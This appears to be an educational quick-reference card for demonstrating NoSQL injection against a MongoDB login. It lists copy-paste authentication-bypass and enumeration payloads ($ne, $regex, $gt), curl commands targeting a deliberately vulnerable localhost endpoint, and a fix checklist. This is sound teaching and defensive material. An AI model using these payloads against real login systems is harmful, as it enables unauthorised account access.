# NoSQL Injection - Quick Reference Card

## 🎯 Attack Summary

**Vulnerability:** NoSQL Injection in MongoDB authentication
**Severity:** Critical (CVSS 9.1)
**Impact:** Complete authentication bypass

---

## 💥 Attack Payloads (Copy-Paste Ready)

### Payload #1: Authentication Bypass

```json
{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
```

**Effect:** Logs in as first user in database without credentials

### Payload #2: Regex User Enumeration

```json
{
  "email": { "$regex": "^admin" },
  "password": { "$ne": null }
}
```

**Effect:** Checks if admin user exists

### Payload #3: Greater Than Operator

```json
{
  "email": { "$gt": "" },
  "password": { "$gt": "" }
}
```

**Effect:** Matches any non-empty email/password

---

## 🧪 Quick Test Commands

### Test Vulnerable Endpoint (Attack Works)

```bash
curl -X POST http://localhost:4000/auth/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
```

### Test Secure Endpoint (Attack Fails)

```bash
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
```

### Run Automated Tests

```bash
node test-nosql-injection.js
```

---

## 🛡️ Fix Checklist

- [x] ✅ Type validation (`typeof email === 'string'`)
- [x] ✅ Input sanitization (convert to string)
- [x] ✅ Format validation (email regex)
- [x] ✅ Parameterized queries (use validated strings)
- [x] ✅ Error handling (generic messages)

---

## 📊 Before vs After

| Aspect            | Vulnerable  | Secure           |
| ----------------- | ----------- | ---------------- |
| Input Validation  | ❌ None     | ✅ Type + Format |
| Accepts Objects   | ❌ Yes      | ✅ No            |
| MongoDB Operators | ❌ Allowed  | ✅ Blocked       |
| Auth Bypass       | ❌ Possible | ✅ Prevented     |

---

## 🎬 Demo Script

1. **Show the vulnerable code** (`/auth/login-vulnerable`)
2. **Login normally** - works as expected
3. **Run NoSQL injection** - bypasses authentication!
4. **Show the secure code** (`/auth/login`)
5. **Run same injection** - attack blocked!
6. **Explain the fixes** (type checking, sanitization)

---

## 📸 Screenshot Checklist

For your report, capture:

- [ ] Postman request with injection payload
- [ ] Successful bypass response (vulnerable endpoint)
- [ ] Failed attack response (secure endpoint)
- [ ] Code comparison (vulnerable vs secure)
- [ ] MongoDB Compass showing bypassed user data
- [ ] Terminal logs showing the attack

---

## ⚠️ Important Reminders

1. **NEVER deploy `/auth/login-vulnerable` to production**
2. Test only on localhost/controlled environments
3. Create a test user first via `/auth/signup`
4. Document everything with screenshots
5. After demo, disable or remove vulnerable endpoint

---

## 📝 One-Liner Explanation

> "NoSQL Injection allows attackers to manipulate MongoDB queries by injecting operators like `$ne` through user input, bypassing authentication. The fix requires strict type validation, input sanitization, and parameterized queries."

---

## 🚀 Quick Start

```bash
# 1. Start MongoDB
mongod

# 2. Start backend
cd server
npm run dev

# 3. Create a test user (use Postman or curl)
# POST http://localhost:4000/auth/signup

# 4. Run the injection test
node test-nosql-injection.js

# 5. Test manually in Postman
# POST http://localhost:4000/auth/login-vulnerable
# Body: {"email": {"$ne": null}, "password": {"$ne": null}}
```

---

## 📚 Full Documentation

See `NOSQL_INJECTION_DEMO.md` for:

- Detailed explanations
- Multiple attack scenarios
- Step-by-step testing guide
- Security best practices
- Report template

---

**Created for educational cybersecurity demonstration**
